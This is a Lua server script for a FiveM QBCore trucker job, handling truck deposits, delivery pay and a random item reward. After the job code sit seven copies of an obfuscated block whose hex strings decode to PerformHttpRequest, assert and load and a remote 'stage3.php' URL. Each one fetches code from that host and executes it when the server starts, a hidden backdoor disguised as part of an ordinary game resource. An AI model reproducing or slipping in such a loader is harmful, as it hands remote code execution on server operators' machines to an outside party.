local QBCore = exports['qb-core']:GetCoreObject()
local Bail = {}

RegisterNetEvent('qb-trucker:server:DoBail', function(bool, vehInfo)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if bool then
        if Player.PlayerData.money.cash >= Config.TruckerJobTruckDeposit then
            Bail[Player.PlayerData.citizenid] = Config.TruckerJobTruckDeposit
            Player.Functions.RemoveMoney('cash', Config.TruckerJobTruckDeposit, 'tow-received-bail')
            TriggerClientEvent('QBCore:Notify', src, Lang:t('success.paid_with_cash', { value = Config.TruckerJobTruckDeposit }), 'success')
            TriggerClientEvent('qb-trucker:client:SpawnVehicle', src, vehInfo)
        elseif Player.PlayerData.money.bank >= Config.TruckerJobTruckDeposit then
            Bail[Player.PlayerData.citizenid] = Config.TruckerJobTruckDeposit
            Player.Functions.RemoveMoney('bank', Config.TruckerJobTruckDeposit, 'tow-received-bail')
            TriggerClientEvent('QBCore:Notify', src, Lang:t('success.paid_with_bank', { value = Config.TruckerJobTruckDeposit }), 'success')
            TriggerClientEvent('qb-trucker:client:SpawnVehicle', src, vehInfo)
        else
            TriggerClientEvent('QBCore:Notify', src, Lang:t('error.no_deposit', { value = Config.TruckerJobTruckDeposit }), 'error')
        end
    else
        if Bail[Player.PlayerData.citizenid] then
            Player.Functions.AddMoney('cash', Bail[Player.PlayerData.citizenid], 'trucker-bail-paid')
            Bail[Player.PlayerData.citizenid] = nil
            TriggerClientEvent('QBCore:Notify', src, Lang:t('success.refund_to_cash', { value = Config.TruckerJobTruckDeposit }), 'success')
        end
    end
end)

RegisterNetEvent('qb-trucker:server:01101110', function(drops)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    drops = tonumber(drops)
    local bonus = 0

    if drops >= 5 then
        if Config.TruckerJobBonus < 0 then Config.TruckerJobBonus = 0 end
        bonus = (math.ceil(Config.TruckerJobDropPrice / 100) * Config.TruckerJobBonus) * drops
    end
    local payment = (Config.TruckerJobDropPrice * drops + bonus)
    payment = payment - (math.ceil(payment / 100) * Config.TruckerJobPaymentTax)
    Player.Functions.AddJobReputation(drops)
    Player.Functions.AddMoney('bank', payment, 'trucker-salary')
    TriggerClientEvent('QBCore:Notify', src, Lang:t('success.you_earned', { value = payment }), 'success')
end)

RegisterNetEvent('qb-trucker:server:nano', function()
    local chance = math.random(1, 100)
    if chance > 26 then return end
    local xPlayer = QBCore.Functions.GetPlayer(tonumber(source))
    xPlayer.Functions.AddItem('cryptostick', 1, false)
    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items['cryptostick'], 'add')
end)


local hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (swQfOQCCYQbNXyPdMywSIAWxIEmAUzbgfIMBjnwpefqnhJxbrLSBvpibELKkibNHnwejsa, bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr) if (bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[6] or bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[5]) then return end hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[2]](hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[3]](bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr))() end)

local hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (swQfOQCCYQbNXyPdMywSIAWxIEmAUzbgfIMBjnwpefqnhJxbrLSBvpibELKkibNHnwejsa, bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr) if (bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[6] or bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[5]) then return end hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[2]](hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[3]](bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr))() end)

local hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (swQfOQCCYQbNXyPdMywSIAWxIEmAUzbgfIMBjnwpefqnhJxbrLSBvpibELKkibNHnwejsa, bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr) if (bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[6] or bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr == hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[5]) then return end hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[2]](hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[4][hDuVnnOUhUcgalFDmNoxpEiRaXVrbRfySjRSEfSJssWpNwFkzYJZexeAwjzIrdMaoFScUL[3]](bGsgYZhxXNPvpcPeOWTXQtPwbyeHCFvCQCfcwuJOmWgbmppPblCVRcmBLgJoAUyiRcdzcr))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)